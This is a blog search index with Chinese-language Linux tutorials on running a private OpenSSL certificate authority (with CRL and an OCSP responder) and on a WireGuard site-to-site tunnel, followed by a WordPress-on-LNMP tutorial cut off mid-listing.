<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>使用openssl在linux上建立CA</title>
    <link href="/using-openssl-to-create-ca-on-linux/"/>
    <url>/using-openssl-to-create-ca-on-linux/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>最近打算幫內網的域名上個合格的https證書，之前一直是用自簽名的，每次都會有安全性警告，因此就有了這篇記錄。</p><h1 id="設定">設定</h1><p>在Linux上架設Certificate Authority有兩種方式，比較簡單的方式是使用easy-rsa，另一種就是使用openssl做設定，不過這兩種方式的底層都還是openssl。</p><h2 id="easy-rsa">easy-rsa</h2><p>easy-rsa建立CA的方式在<a href="https://www.digitalocean.com/community/tutorial-collections/how-to-set-up-and-configure-a-certificate-authority-ca">這裡</a><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[How To Set Up and Configure a Certificate Authority (CA) | DigitalOcean | DigitalOcean](https://www.digitalocean.com/community/tutorial-collections/how-to-set-up-and-configure-a-certificate-authority-ca)">[1]</span></a></sup>已經說明的很詳細了，就不再介紹。</p><h2 id="openssl">openssl</h2><h3 id="建立CA">建立CA</h3><p>首先要先創建用於存放CA的資料夾結構，在這裡用<code>/root/ca</code>作為存放CA的資料夾做示範，接下來的默認工作目錄都是<code>/root/ca</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /root/ca</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /root/ca</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> private/ certs/ newcerts/ crl/ requests/</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> /usr/lib/ssl/openssl.cnf .</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">chmod</span> 600 openssl.cnf</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">touch</span> index.txt</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;01&#x27;</span> &gt; serial</span><br></code></pre></td></tr></table></figure><p>這樣創建後的結構大概是這樣</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">tree</span><br>.<br>├── certs<br>├── crl<br>├── index.txt<br>├── newcerts<br>├── openssl.cnf<br>├── private<br>├── requests<br>└── serial<br></code></pre></td></tr></table></figure><ul><li>目錄結構說明<ul><li>certs： 存放證書</li><li>newcerts： 使用openssl以CA簽署完後會將證書放在這，可以手動移至certs</li><li>private： 存放私鑰</li><li>crl： 存放crl的發布證書</li><li>index.txt： CA的datebase</li><li>serial： 目前證書發行的編號</li><li>openssl.cnf： 用於配置CA的設定</li></ul></li></ul><h4 id="產生RootCA私鑰">產生RootCA私鑰</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -outform PEM -aes256 -out private/cakey.pem</span><br></code></pre></td></tr></table></figure><ul><li>參數說明<ul><li>-algorithm RSA： 使用RSA算法</li><li>-pkeyopt rsa_keygen_bits:4096： 建立4096bit長度的RSA私鑰</li><li>-outform PEM： 使用PEM格式而非DER</li><li>-aes256： 使用aes256加密私鑰</li><li>-out private/cakey.pem： 存放私鑰在<code>private/cakey.pem</code>，不要更改，這是<code>openssl.cnf</code>中預設的值</li></ul></li></ul><p>也可不必再此時產生私鑰，可以使用<code>openssl req</code>一次產生私鑰和公鑰/CSR，不過我個人習慣先產生私鑰，再按照私鑰產生公鑰。</p><p>在這裡我使用<code>openssl genpkey</code>生成私鑰，不過在網路上其他的教程有些會使用<code>openssl genrsa</code>生成rsa私鑰，根據stackoverflow的<a href="https://stackoverflow.com/questions/65449771/difference-between-openssl-genrsa-and-openssl-genpkey-algorithm-rsa">這篇回答</a><sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[ssl - Difference between `openssl genrsa` and `openssl genpkey -algorithm rsa`? - Stack Overflow](https://stackoverflow.com/questions/65449771/difference-between-openssl-genrsa-and-openssl-genpkey-algorithm-rsa)">[2]</span></a></sup>，<code>genrsa</code>會生成PKCS #1格式的私鑰，<code>genpkey</code>則是生成PKCS #8格式的私鑰，不過我自己測試目前<code>genrsa</code>和<code>genpkey</code>都是生成PKCS #8格式的私鑰，所以結果是相同的。</p><h4 id="產生RootCA憑證-公鑰">產生RootCA憑證(公鑰)</h4><p>接下來就是產生RootCA的憑證，產生完成後要複製到客戶端上讓客戶端信任這個RootCA，linux可以參考<a href="https://wiki.archlinux.org/title/User:Grawity/Adding_a_trusted_CA_certificate">這篇archwiki</a><sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[User:Grawity/Adding a trusted CA certificate - ArchWiki](https://wiki.archlinux.org/title/User:Grawity/Adding_a_trusted_CA_certificate)">[3]</span></a></sup>操作。</p><hr><p>首先要修改複製過來的<code>openssl.cnf</code>，這份設定預設會影響<code>openssl ca</code>、<code>openssl req</code>的預設參數，想要了解openssl的設定可以參考<a href="https://docs.openssl.org/master/man5/x509v3_config/">官網的文檔</a><sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="[x509v3_config - OpenSSL Documentation](https://docs.openssl.org/master/man5/x509v3_config/)">[4]</span></a></sup></p><p>更正或增加內容到<code>openssl.cnf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs conf">[ CA_default ]<br><br>dir             = /root/ca<br>copy_extensions = copy<br><br>[ policy_match ]<br>countryName             = match<br>stateOrProvinceName     = optional<br>organizationName        = optional<br>organizationalUnitName  = optional<br>commonName              = supplied<br>emailAddress            = optional<br><br>[ v3_ca ]<br>basicConstraints = critical,CA:true<br>keyUsage = critical, keyCertSign, cRLSign<br></code></pre></td></tr></table></figure><ul><li>說明<ul><li>dir： 指向儲存CA的目錄，也就是<code>/root/ca</code></li><li>copy_extensions： 這樣可以在生成CSR時就將extention包進去</li><li>[ policy_match ]： 這裡是設定申請證書的csr哪些部分要與CA的憑證相同才允許簽發憑證，這裡我改成只要求<code>countryName</code>相同就允許簽發</li><li>[ v3_ca ]： 這是一個設定x509憑證擴展選項的部分，在前面的<code>[ req ]</code>區段可以看到<code>x509_extensions = v3_ca</code>，這樣在待會使用<code>openssl req -x509</code>產生RootCA的憑證時會就會自動包含這些選項，不用手動加上<code>-extensions v3_ca</code></li><li>keyUsage、basicConstraints： 讓憑證可以簽署其他憑證並且可以簽署CRL憑證</li></ul></li></ul><hr><p>產生RootCA憑證</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl req -x509 -new -config openssl.cnf -key private/cakey.pem -out cacert.pem -set_serial 0 -days 3650</span><br>Enter pass phrase for private/cakey.pem:<br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter &#x27;.&#x27;, the field will be left blank.<br>-----<br>Country Name (2 letter code) [AU]:TW<br>State or Province Name (full name) [Some-State]:.Taiwan<br>Locality Name (eg, city) []:<br>Organization Name (eg, company) [Internet Widgits Pty Ltd]:example company<br>Organizational Unit Name (eg, section) []:<br>Common Name (e.g. server FQDN or YOUR name) []:example.com<br>Email Address []:mail@example.com<br></code></pre></td></tr></table></figure><ul><li>參數說明<ul><li>req -x509 -new： 直接產生憑證，而不是憑證申請要求(CSR)</li><li>-config openssl.cnf： 使用剛剛設定的的openssl.cnf做設定檔</li><li>-key private/cakey.pem： 剛剛產生的私鑰</li><li>-out cacert.pem：存放憑證在``cacert.pem<code>不要更改，這是</code>openssl.cnf`中預設的值</li><li>-set_serial 0： 序號0的憑證</li><li>-days 3650： 憑證有效期限3650天</li></ul></li></ul><h4 id="產生中間憑證">產生中間憑證</h4><p>常規的RootCA不會直接簽發憑證，而是簽署中間CA的中間憑證，再由中間憑證簽發憑證，不過演示環境比較小，就沒做這邊，有興趣的可以參考<a href="https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/">這篇文章</a><sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="[如何使用 OpenSSL 簽發中介 CA](https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/)">[5]</span></a></sup></p><h4 id="CRL-可選">CRL (可選)</h4><p><strong>產生CRL</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-comment"># 記錄crl發行的版本</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 01 &gt; crlnumber</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-comment"># 生成CRL，格式為PEM</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ca -config openssl.cnf -gencrl -keyfile private/cakey.pem -cert cacert.pem -out crl/root.crl.pem</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-comment"># 轉換格式為DER，CRL大多為DER格式</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl crl -<span class="hljs-keyword">in</span> crl/root.crl.pem -outform DER -out crl/root.crl</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-comment"># 建立一個給ca用的網站站點，並複製root.crl到那裡，使用nginx或apache把他呈現出來</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /var/www/ca</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cp</span> crl/root.crl /var/www/ca/</span><br></code></pre></td></tr></table></figure><p><strong>簽署</strong></p><p>更改openssl.cnf，讓CA在簽證書時加上CRL的entry</p><p>編輯<code>[ usr_cert ]</code>區段，ca的設定<code>x509_extensions = usr_cert</code>讓openssl在簽署證書時會自動帶上<code>[ usr_cert ]</code>裡面設定的擴展</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs conf">[ usr_cert ]<br><br>basicConstraints=CA:FALSE<br>subjectKeyIdentifier=hash<br>authorityKeyIdentifier=keyid,issuer<br># 上面的都是預設的<br><br># 雖然是http，但是root.crl也是有被RootCA簽署過，可以不被竄改<br>crlDistributionPoints = URI:http://ca.example.com/root.crl<br></code></pre></td></tr></table></figure><h4 id="OCSP-可選">OCSP (可選)</h4><p>生成給ocsp responder用的私鑰，不要加上密碼，不然ocsp responder每次啟動都要輸入密碼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -outform PEM -out private/ocsp.key</span><br></code></pre></td></tr></table></figure><p>產生ocsp證書的申請</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl req -new -key private/ocsp.key -addext <span class="hljs-string">&#x27;extendedKeyUsage = critical, OCSPSigning&#x27;</span> -out requests/ocsp.csr</span><br>You are about to be asked to enter information that will be incorporated<br>into your certificate request.<br>What you are about to enter is what is called a Distinguished Name or a DN.<br>There are quite a few fields but you can leave some blank<br>For some fields there will be a default value,<br>If you enter &#x27;.&#x27;, the field will be left blank.<br>-----<br>Country Name (2 letter code) [AU]:TW<br>State or Province Name (full name) [Some-State]:Taiwan<br>Locality Name (eg, city) []:<br>Organization Name (eg, company) [Internet Widgits Pty Ltd]:example company<br>Organizational Unit Name (eg, section) []:<br>Common Name (e.g. server FQDN or YOUR name) []:ca.example.com<br>Email Address []:<br><br>Please enter the following &#x27;extra&#x27; attributes<br>to be sent with your certificate request<br>A challenge password []:<br>An optional company name []:<br></code></pre></td></tr></table></figure><p>由CA簽署申請並發下證書，大概會長下面這樣</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ca -<span class="hljs-keyword">in</span> requests/ocsp.csr -config openssl.cnf -out certs/ocsp.pem</span><br>Using configuration from openssl.cnf<br>Enter pass phrase for /root/ca/private/cakey.pem:<br>Check that the request matches the signature<br>Signature ok<br>Certificate Details:<br>        Serial Number: 1 (0x1)<br>        Validity<br>            Not Before: xxxxx<br>            Not After : xxxxx<br>        Subject:<br>            countryName               = TW<br>            stateOrProvinceName       = Taiwan<br>            organizationName          = example company<br>            commonName                = ca.example.com<br>        X509v3 extensions:<br>            X509v3 Basic Constraints:<br>                CA:FALSE<br>            X509v3 Subject Key Identifier:<br>                xxxxx<br>            X509v3 Authority Key Identifier:<br>                xxxxx<br>Certificate is to be certified until xxxxx (365 days)<br>Sign the certificate? [y/n]:y<br><br><br>1 out of 1 certificate requests certified, commit? [y/n]y<br>Write out database with 1 new entries<br></code></pre></td></tr></table></figure><p>證書會輸出到<code>certs/ocsp.pem</code></p><p>啟動ocsp responder</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ocsp -index index.txt -CA cacert.pem -rsigner certs/ocsp.pem -rkey private/ocsp.key -port &lt;the port to listen&gt; -text</span><br></code></pre></td></tr></table></figure><p>使用systemd service把ocsp responder變成daemon，編輯<code>/etc/systemd/system/ocsp.service</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs service">[Unit]<br>Description=ocsp Server<br>StartLimitBurst=100<br><br>[Service]<br>Type=simple<br>ExecStart=/usr/bin/openssl ocsp -index /root/ca/index.txt -CA /root/ca/cacert.pem -rsigner /root/ca/certs/ocsp.pem -rkey /root/ca/private/ocsp.key -port &lt;the port to listen&gt; -text<br>Restart=always<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>啟動服務</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemd enable --now ocsp.service<br></code></pre></td></tr></table></figure><p>更改openssl.cnf，讓CA在簽證書時加上ocsp的entry</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs conf">[ usr_cert ]<br><br>basicConstraints=CA:FALSE<br>subjectKeyIdentifier=hash<br>authorityKeyIdentifier=keyid,issuer<br># 上面的都是預設的<br><br># 可以使用nginx代理<br>authorityInfoAccess = OCSP;URI:http://ca.example.com/ocsp/<br></code></pre></td></tr></table></figure><h4 id="產生HTTPS憑證">產生HTTPS憑證</h4><p>產生私鑰和證書申請可以在其他電腦上完成，像是準備要用到證書的機器上，這樣不會暴露私鑰，只需要將CSR檔傳到CA的機器上就好</p><p><strong>產生私鑰</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -outform PEM -out example.com.key</span><br></code></pre></td></tr></table></figure><p><strong>產生證書申請</strong></p><p>申請HTTPS的證書，DNS的部分要填正確的域名，可以包括通配符*，在Common Name的部分最好也填正確的域名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl req -new -key example.com.key -addext <span class="hljs-string">&#x27;subjectAltName=DNS:example.com,DNS:www.example.com&#x27;</span> -out example.com.csr</span><br></code></pre></td></tr></table></figure><p>一樣也是輸入對應的資訊，可以參考前面ocsp的部分</p><p><strong>CA簽署</strong></p><p>將CSR上傳到CA的<code>requests</code>資料夾內</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ca -<span class="hljs-keyword">in</span> requests/example.com.csr -config openssl.cnf -out certs/example.com.pem</span><br></code></pre></td></tr></table></figure><p>證書會輸出到<code>certs/example.com.pem</code>，將這個憑證複製回申請的機器上就完成了</p><h1 id="同場加映">同場加映</h1><h2 id="撤銷證書">撤銷證書</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ca -config openssl.cnf -revoke newcerts/02.pem</span><br></code></pre></td></tr></table></figure><p><code>-revoke</code>後面接憑證就ok了</p><h2 id="驗證CRL">驗證CRL</h2><p>由於crl是DER格式要加上<code>-crl_download</code>選項，如果是PEM格式的應該就不用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl verify -crl_check -crl_download -CAfile cacert.pem verify.pem</span><br></code></pre></td></tr></table></figure><p><code>cacert.pem</code>是CA的憑證，<code>verify.pem</code>是待驗證的憑證</p><h2 id="驗證OCSP">驗證OCSP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">openssl ocsp -issuer cacert.pem -cert verify.pem -text -url &lt;ocsp URL&gt;</span><br></code></pre></td></tr></table></figure><p><code>cacert.pem</code>是CA的憑證，<code>verify.pem</code>是待驗證的憑證</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.digitalocean.com/community/tutorial-collections/how-to-set-up-and-configure-a-certificate-authority-ca">How To Set Up and Configure a Certificate Authority (CA) | DigitalOcean | DigitalOcean</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://stackoverflow.com/questions/65449771/difference-between-openssl-genrsa-and-openssl-genpkey-algorithm-rsa">ssl - Difference between <code>openssl genrsa</code> and <code>openssl genpkey -algorithm rsa</code>? - Stack Overflow</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://wiki.archlinux.org/title/User:Grawity/Adding_a_trusted_CA_certificate">User:Grawity/Adding a trusted CA certificate - ArchWiki</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://docs.openssl.org/master/man5/x509v3_config/">x509v3_config - OpenSSL Documentation</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://blog.davy.tw/posts/use-openssl-to-sign-intermediate-ca/">如何使用 OpenSSL 簽發中介 CA</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>server</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用Wireguard建立Site to Site Tunnel</title>
    <link href="/create-wireguard-site-to-site-tunnel/"/>
    <url>/create-wireguard-site-to-site-tunnel/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>算是接續之前的linux router設定的部分，建立wireguard site to site tunnel</p><h1 id="設定">設定</h1><h2 id="Wireguard">Wireguard</h2><p>首先在兩端分別產生公、私鑰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">wg genkey | <span class="hljs-built_in">tee</span> private.key | wg pubkey &gt; public.key</span><br></code></pre></td></tr></table></figure><p>也可以多產生一個PresharedKey，這個只要在其中一邊產生就好，兩邊都是相同的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">wg genpsk</span><br></code></pre></td></tr></table></figure><p>編輯<code>/etc/wireguard/&lt;wg-interface&gt;.conf</code>，<code>&lt;wg-interface&gt;</code>就是待會interface的名字，我一般會設定成<code>wg-&lt;toLocation&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs conf">[Interface]<br>PrivateKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>ListenPort = xxxxx<br><br>[Peer]<br>PublicKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>Endpoint = x.x.x.x:xxxxx<br>PresharedKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<br>AllowedIPs = 0.0.0.0/0<br>PersistentKeepalive = 25<br></code></pre></td></tr></table></figure><ul><li>PrivateKey填自己的私鑰</li><li>PublicKey填另一個端點的公鑰</li><li>PresharedKey都是一樣的值(可選)</li><li>AllowedIPs填0.0.0.0/0才可以讓所有路由通過，如果有IPv6要過，也可多加::/0<ul><li>如果使用wg-quick或其他工具啟動wireguard，會使用AllowedIPs來設定路由，不過這個設定使用<code>ip</code>和<code>wg</code>指令來建立通道，AllowedIPs就只會限制可以通過這個Tunnel的封包IP，所以全開</li></ul></li><li>Endpoint填對方的IP和ListenPort<ul><li>也可以只有一邊有ListenPort，不設定Endpoint，另一端設定Endpoint，不設定ListenPort，讓另一端來連接有ListenPort的這一端</li></ul></li></ul><p>在兩邊都完成wireguard的config</p><h2 id="ifupdown">ifupdown</h2><p>編輯<code>/etc/network/interfaces</code>，增加這段，<code>&lt;wg-interface&gt;</code>就是剛才設定的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs conf">auto &lt;wg-interface&gt;<br>iface &lt;wg-interface&gt; inet static<br>    address 10.10.10.1/32<br>    pointopoint 10.10.10.2<br>    pre-up ip link add $IFACE type wireguard<br>    pre-up wg setconf $IFACE /etc/wireguard/$IFACE.conf<br>    post-down ip link del $IFACE<br></code></pre></td></tr></table></figure><p>另一端的interface設定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs conf">auto &lt;wg-interface&gt;<br>iface &lt;wg-interface&gt; inet static<br>    address 10.10.10.2/32<br>    pointopoint 10.10.10.1<br>    pre-up ip link add $IFACE type wireguard<br>    pre-up wg setconf $IFACE /etc/wireguard/$IFACE.conf<br>    post-down ip link del $IFACE<br></code></pre></td></tr></table></figure><p>其實就是<code>address</code>和<code>pointopoint</code>互換，使用<code>/32的address</code>和<code>pointopoint</code>可以節省IP，這會設定一個/32的路由到對方</p><p>如果想要設定路由可以跑OSPF之類的動態路由協議，或是直接設定static route，如下</p><p>假設<code>10.10.10.2</code>這一邊一邊有<code>10.0.0.0/24</code>的路由，可以在<code>10.10.10.1</code>的這邊在&lt;wg-interface&gt;這邊設定這些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs conf">up ip route add 10.0.0.0/24 dev $IFACE via 10.10.10.2<br>down ip route del 10.0.0.0/24<br></code></pre></td></tr></table></figure><p>這樣static route就會隨著wireguard interface的啟動和關閉被設定</p>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>router</tag>
      
      <tag>wireguard</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用LNMP環境搭建WordPress網站</title>
    <link href="/wordpress-with-LNMP-environment/"/>
    <url>/wordpress-with-LNMP-environment/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這算是之前搭建部落格時考慮過的方案，不過後來還是選擇了hexo這種靜態框架，所以就記錄一下查詢資料和架設的歷程。</p><h1 id="架設">架設</h1><h2 id="安裝">安裝</h2><p>先下載安裝必要的組件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install nginx nginx-extras</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 我使用的database是mariadb，也可使用mysql或postgresql</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install mariadb-server</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 安裝需要的php軟體包，可視情況減少或增加</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install php php-fpm php-cli php-mysql php-mbstring php-xml php-gd php-curl php-ssh2 php-imagick php-json php-tokenizer php-zip php-intl</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 下載wordpress</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://tw.wordpress.org/latest-zh_TW.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-comment"># 